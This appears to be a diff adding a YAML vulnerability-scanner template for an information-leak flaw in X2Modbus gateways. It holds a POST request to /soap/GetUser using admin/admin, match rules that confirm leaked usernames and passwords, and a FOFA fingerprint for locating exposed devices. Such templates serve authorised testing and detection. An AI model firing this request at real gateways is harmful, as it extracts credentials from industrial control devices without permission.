@@ -1,0 +1,25 @@
+id: poc-yaml-x2modbus-getuser-info-leak
+info:
+  name: X2Modbus网关 GetUser 敏感信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: X2Modbus
+  fofa: icon_hash="-1384370370"
+requests:
+- method: POST
+  path: /soap/GetUser
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: <GetUser><User Name="admin" Password="admin"/></GetUser>
+  expression: 'status_code == 200 &&
+
+    contains(body,"<PassWord>") &&
+
+    matches(body,"<UserName>[0-9a-zA-Z]+</UserName>") &&
+
+    contains(content_type,"text/xml")
+
+    '
+variables: {}
+transport: http
